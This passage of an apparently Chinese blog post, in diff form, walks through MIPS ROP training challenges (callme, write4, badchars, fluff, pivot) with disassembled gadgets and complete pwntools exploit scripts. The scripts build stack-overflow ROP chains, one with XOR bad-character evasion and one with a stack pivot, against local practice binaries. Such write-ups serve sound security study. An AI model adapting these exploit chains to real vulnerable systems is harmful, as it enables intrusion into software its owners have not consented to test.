+<p>根据所给gadgets可以布置栈结构，<code>jalr $t9</code>用于调用<code>callme</code>三个函数，<code>jr $ra</code>用于调用回gadgets，这样就可以持续调用了</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-mipsel&#x27;, &#x27;-g&#x27;, &#x27;12345&#x27;, &#x27;./callme_mipsel&#x27;])</span></span><br><span class="line">io = process(<span class="string">&#x27;./callme_mipsel&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x400bb0</span></span><br><span class="line">callme_three = <span class="number">0x400d10</span></span><br><span class="line">callme_two = <span class="number">0x400d80</span></span><br><span class="line">callme_one = <span class="number">0x400d20</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00400BB0                               usefulGadgets:</span></span><br><span class="line"><span class="string">.text:00400BB0 10 00 A4 8F                   lw      $a0, 0x10($sp)</span></span><br><span class="line"><span class="string">.text:00400BB4 0C 00 A5 8F                   lw      $a1, 0xC($sp)</span></span><br><span class="line"><span class="string">.text:00400BB8 08 00 A6 8F                   lw      $a2, 8($sp)</span></span><br><span class="line"><span class="string">.text:00400BBC 04 00 B9 8F                   lw      $t9, 4($sp)</span></span><br><span class="line"><span class="string">.text:00400BC0 09 F8 20 03                   jalr    $t9</span></span><br><span class="line"><span class="string">.text:00400BC4 00 00 00 00                   nop</span></span><br><span class="line"><span class="string">.text:00400BC4</span></span><br><span class="line"><span class="string">.text:00400BC8 14 00 BF 8F                   lw      $ra, 0x14($sp)</span></span><br><span class="line"><span class="string">.text:00400BCC 08 00 E0 03                   jr      $ra</span></span><br><span class="line"><span class="string">.text:00400BD0 18 00 BD 23                   addi    $sp, 0x18</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(gadget) + p32(<span class="number">0</span>) + p32(callme_one) + p32(<span class="number">0xd00df00d</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xdeadbeef</span>) + \</span><br><span class="line">          p32(gadget) + p32(<span class="number">0</span>) + p32(callme_two) + p32(<span class="number">0xd00df00d</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xdeadbeef</span>) + \</span><br><span class="line">          p32(gadget) + p32(<span class="number">0</span>) + p32(callme_three) + p32(<span class="number">0xd00df00d</span>) + p32(<span class="number">0xcafebabe</span>) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h3><p>程序中调用的函数都在libc中，仍然给了gadgets</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               usefulGadgets:</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400944</span><br><span class="line">.text:00400948 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:0040094C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400950 09 F8 20 03                   jalr    $t9</span><br></pre></td></tr></table></figure></div>
+
+<p>很明显第一段gadget是任意地址写，第二段gadget是任意函数调用并传递一个参数，因此我们的思路就是先给程序中写入<code>flag.txt</code>字符串，然后直接传入参数调用<code>print_file()</code>函数</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-mipsel&#x27;, &#x27;-g&#x27;, &#x27;12345&#x27;, &#x27;./write4_mipsel&#x27;])</span></span><br><span class="line">io = process(<span class="string">&#x27;./write4_mipsel&#x27;</span>)</span><br><span class="line"></span><br><span class="line">store_gadget = <span class="number">0x400930</span></span><br><span class="line">jmp_gadget = <span class="number">0x400948</span></span><br><span class="line">print_file = <span class="number">0x400a90</span></span><br><span class="line">start = <span class="number">0x4006f0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00400948 08 00 A4 8F                   lw      $a0, 8($sp)</span></span><br><span class="line"><span class="string">.text:0040094C 04 00 B9 8F                   lw      $t9, 4($sp)</span></span><br><span class="line"><span class="string">.text:00400950 09 F8 20 03                   jalr    $t9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Go ahead and give me the input already!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(store_gadget) + p32(<span class="number">0</span>) + <span class="string">b&#x27;flag&#x27;</span> + p32(<span class="number">0x411100</span>) + p32(start)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Go ahead and give me the input already!\n&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(store_gadget) + p32(<span class="number">0</span>) + <span class="string">b&#x27;.txt&#x27;</span> + p32(<span class="number">0x411104</span>) + p32(start)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Go ahead and give me the input already!\n&#x27;</span>)</span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(jmp_gadget) + p32(<span class="number">0</span>) + p32(print_file) + p32(<span class="number">0x411100</span>)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h3><p>相比上一题只过滤了几个字符，同时也给了一个进行异或操作的gadget，仍旧是直接ROP，相比上一题加上异或操作就行，所给gadgets</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               usefulGadgets:</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400944</span><br><span class="line">.text:00400948 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:0040094C 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400950 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:00400954 00 00 2A 8D                   lw      $t2, 0($t1)</span><br><span class="line">.text:00400958 26 40 0A 01                   xor     $t0, $t2</span><br><span class="line">.text:0040095C 00 00 28 AD                   sw      $t0, 0($t1)</span><br><span class="line">.text:00400960 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400964 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400964</span><br><span class="line">.text:00400968 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:0040096C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400970 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400974 0C 00 BD 23                   addi    $sp, 0xC</span><br></pre></td></tr></table></figure></div>
+
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-mipsel&#x27;, &#x27;-g&#x27;, &#x27;12345&#x27;, &#x27;./badchars_mipsel&#x27;])</span></span><br><span class="line">io = process(<span class="string">&#x27;./badchars_mipsel&#x27;</span>)</span><br><span class="line"></span><br><span class="line">store_gadget = <span class="number">0x400930</span></span><br><span class="line">xor_gadget = <span class="number">0x400948</span></span><br><span class="line">jmp_gadget = <span class="number">0x400968</span></span><br><span class="line">start = <span class="number">0x4006f0</span></span><br><span class="line">print_file = <span class="number">0x400ab0</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(store_gadget) + p32(<span class="number">0</span>) + <span class="string">b&#x27;AAAA&#x27;</span> + p32(<span class="number">0x411100</span>) + p32(start)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(store_gadget) + p32(<span class="number">0</span>) + <span class="string">b&#x27;AAAA&#x27;</span> + p32(<span class="number">0x411104</span>) + p32(start)</span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(xor_gadget) + p32(<span class="number">0</span>) + p32(<span class="number">0x411100</span>) + <span class="string">b&#x27;\x27\x2d\x20\x26&#x27;</span> + p32(start)</span><br><span class="line">payload4 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(xor_gadget) + p32(<span class="number">0</span>) + p32(<span class="number">0x411104</span>) + <span class="string">b&#x27;\x6f\x35\x39\x35&#x27;</span> + p32(start)</span><br><span class="line">payload5 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(jmp_gadget) + p32(<span class="number">0</span>) + p32(print_file) + p32(<span class="number">0x411100</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.send(payload3)</span><br><span class="line">io.send(payload4)</span><br><span class="line">io.send(payload5)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h3><p>一个比较复杂的ROP链，如果能看懂所给的每个gadget的话，思路还是比较清晰的。</p>
+<p>所给gadget为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               questionableGadgets:</span><br><span class="line">.text:00400930 08 00 B9 8F                   lw      $t9, 8($sp)</span><br><span class="line">.text:00400934 04 00 AC 8F                   lw      $t4, 4($sp)</span><br><span class="line">.text:00400938 26 88 31 02                   xor     $s1, $s1                         # 清空s1</span><br><span class="line">.text:0040093C 41 00 04 3C 70 2C 84 34       li      $a0, 0x412C70</span><br><span class="line">.text:00400944 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400948 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class="line">.text:00400948</span><br><span class="line">.text:0040094C 08 00 B9 8F                   lw      $t9, 8($sp)</span><br><span class="line">.text:00400950 04 00 B2 8F                   lw      $s2, 4($sp)                      # load s2</span><br><span class="line">.text:00400954 41 00 0C 3C 74 2C 8C 35       li      $t4, 0x412C74</span><br><span class="line">.text:0040095C 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400960 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class="line">.text:00400960</span><br><span class="line">.text:00400964 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400968 26 88 32 02                   xor     $s1, $s2                         # s1=0   则s1=s2</span><br><span class="line">.text:0040096C 41 00 05 3C 00 15 A5 34       li      $a1, 0x411500</span><br><span class="line">.text:00400974 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400978 08 00 BD 23                   addi    $sp, 8</span><br><span class="line">.text:00400978</span><br><span class="line">.text:0040097C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400980 26 80 11 02                   xor     $s0, $s1                         # 交换s0和s1</span><br><span class="line">.text:00400984 26 88 11 02                   xor     $s1, $s0, $s1</span><br><span class="line">.text:00400988 26 80 11 02                   xor     $s0, $s1</span><br><span class="line">.text:0040098C 41 00 0D 3C 04 15 AD 35       li      $t5, 0x411504</span><br><span class="line">.text:00400994 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400998 08 00 BD 23                   addi    $sp, 8</span><br><span class="line">.text:00400998</span><br><span class="line">.text:0040099C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:004009A0 00 00 11 AE                   sw      $s1, 0($s0)</span><br><span class="line">.text:004009A4 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:004009A8 08 00 BD 23                   addi    $sp, 8</span><br><span class="line">.text:004009A8</span><br><span class="line">.text:004009AC 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:004009B0 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:004009B4 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:004009B8 0C 00 BD 23                   addi    $sp, 0xC</span><br></pre></td></tr></table></figure></div>
+
+<p>显然，我们可以看出来gadget1到gadget4都是操作s0，s1，s2间的数据的，而gadget5可以存储数据到内存中，gadget6可以传参调用函数。因此我们的思路就是使用gadget1到gadget4来为gadget5做准备，写入<code>flag.txt</code>字符串到程序中，然后直接传参调用<code>print_file</code>函数。</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-mipsel&#x27;, &#x27;-g&#x27;, &#x27;12345&#x27;, &#x27;./fluff_mipsel&#x27;])</span></span><br><span class="line">io = process(<span class="string">&#x27;./fluff_mipsel&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x400930</span>              <span class="comment">#s1 = 0</span></span><br><span class="line">gadget2 = <span class="number">0x40094c</span>              <span class="comment">#load s2</span></span><br><span class="line">gadget3 = <span class="number">0x400964</span>              <span class="comment">#s1 = 0  ===&gt;  s1 = s2</span></span><br><span class="line">gadget4 = <span class="number">0x40097c</span>              <span class="comment">#s0 &lt;==&gt; s1</span></span><br><span class="line">gadget5 = <span class="number">0x40099c</span>              <span class="comment">#store $s1, 0($s0)</span></span><br><span class="line">gadget6 = <span class="number">0x4009ac</span>              <span class="comment">#$a0 &amp; jmp $t9</span></span><br><span class="line">flag = <span class="number">0x411100</span></span><br><span class="line">print_file = <span class="number">0x400af0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(gadget1) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(gadget2) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(flag) + p32(gadget3) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget4) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget1) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(gadget2) + \</span><br><span class="line">          p32(<span class="number">0</span>) + <span class="string">b&#x27;flag&#x27;</span> + p32(gadget3) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget5) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget1) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(gadget2) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(flag+<span class="number">4</span>) + p32(gadget3) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget4) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget1) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(gadget2) + \</span><br><span class="line">          p32(<span class="number">0</span>) + <span class="string">b&#x27;.txt&#x27;</span> + p32(gadget3) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget5) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(gadget6) + \</span><br><span class="line">          p32(<span class="number">0</span>) + p32(print_file) + p32(flag)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h3><p>经典栈迁移，恰好溢出到返回地址，同时控制fp，并且程序给出了pivot到的位置，也可以在该位置写入payload。然后来看程序给出的gadget</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00400CA0                               usefulGadgets:</span><br><span class="line">.text:00400CA0 08 00 B9 8F                   lw      $t9, 8($sp)</span><br><span class="line">.text:00400CA4 04 00 A8 8F                   lw      $t0, 4($sp)</span><br><span class="line">.text:00400CA8 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400CAC 0C 00 BD 27                   addiu   $sp, 0xC</span><br><span class="line">.text:00400CAC</span><br><span class="line">.text:00400CB0 08 00 B9 8F                   lw      $t9, 8($sp)</span><br><span class="line">.text:00400CB4 04 00 AA 8F                   lw      $t2, 4($sp)</span><br><span class="line">.text:00400CB8 00 00 49 8D                   lw      $t1, 0($t2)</span><br><span class="line">.text:00400CBC 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400CC0 0C 00 BD 27                   addiu   $sp, 0xC</span><br><span class="line">.text:00400CC0</span><br><span class="line">.text:00400CC4 20 C8 09 01                   add     $t9, $t0, $t1</span><br><span class="line">.text:00400CC8 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400CCC 04 00 BD 27                   addiu   $sp, 4</span><br><span class="line">.text:00400CCC</span><br><span class="line">.text:00400CD0 25 E8 C0 03                   move    $sp, $fp</span><br><span class="line">.text:00400CD4 08 00 BF 8F                   lw      $ra, 8($sp)</span><br><span class="line">.text:00400CD8 04 00 BE 8F                   lw      $fp, 4($sp)</span><br><span class="line">.text:00400CDC 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:00400CE0 0C 00 BD 27                   addiu   $sp, 0xC</span><br></pre></td></tr></table></figure></div>
+
+<p>主要功能如下</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gadget1 = <span class="number">0x400ca0</span>      <span class="comment"># $t0 = 4($sp)</span></span><br><span class="line">gadget2 = <span class="number">0x400cb0</span>      <span class="comment"># $t2 = 4($sp)              lw $t1, 0($t2)</span></span><br><span class="line">gadget3 = <span class="number">0x400cc4</span>      <span class="comment"># $t9 = $t0 + $t1</span></span><br><span class="line">gadget4 = <span class="number">0x400cd0</span>      <span class="comment"># move $sp, $fp             $fp</span></span><br></pre></td></tr></table></figure></div>
+
+<p>因此就有如下思路，先栈迁移到第一次输入位置，第一次输入布置ROP为先调用<code>foothold_funtion</code>，用来加载其函数地址到程序got表，然后使用gadget2加载其地址到<code>$t2</code>寄存器，再使用gadget1加载其与<code>ret2win</code>的偏移到<code>$t0</code>，最后gadget3直接跳转到<code>ret2win</code>函数</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-mipsel&#x27;, &#x27;-g&#x27;, &#x27;12345&#x27;, &#x27;./pivot_mipsel&#x27;])</span></span><br><span class="line">io = process(<span class="string">&#x27;./pivot_mipsel&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x400ca0</span>      <span class="comment"># $t0 = 4($sp)</span></span><br><span class="line">gadget2 = <span class="number">0x400cb0</span>      <span class="comment"># $t2 = 4($sp)              lw $t1, 0($t2)</span></span><br><span class="line">gadget3 = <span class="number">0x400cc4</span>      <span class="comment"># $t9 = $t0 + $t1</span></span><br><span class="line">gadget4 = <span class="number">0x400cd0</span>      <span class="comment"># move $sp, $fp             $fp</span></span><br><span class="line"></span><br><span class="line">foothold_plt = <span class="number">0x400e60</span></span><br><span class="line">foothold_got = <span class="number">0x412060</span></span><br><span class="line">foothold_ret2win_offset = <span class="number">0x378</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pivot_loc = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Send a ROP chain now and it will land there\n&#x27;</span>)</span><br><span class="line">payload1 = p32(<span class="number">0</span>) + p32(pivot_loc) + p32(gadget1)\</span><br><span class="line">         + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(foothold_plt)\</span><br><span class="line">         + p32(<span class="number">0</span>) + p32(foothold_got) + p32(gadget1)\</span><br><span class="line">         + p32(<span class="number">0</span>) + p32(foothold_ret2win_offset) + p32(gadget3)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Now please send your stack smash\n&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p32(pivot_loc) + p32(gadget4)        <span class="comment">#pivot to payload1</span></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>熟悉x86_64栈溢出的话，这道题基本就调试一下就可以做出来了，gadget位于<code>__libc_csu_init</code>函数中，只要我们可以控制<code>$a0 $a1 $a2</code>然后就可以直接调用<code>ret2win</code>函数。gadget如下</p>
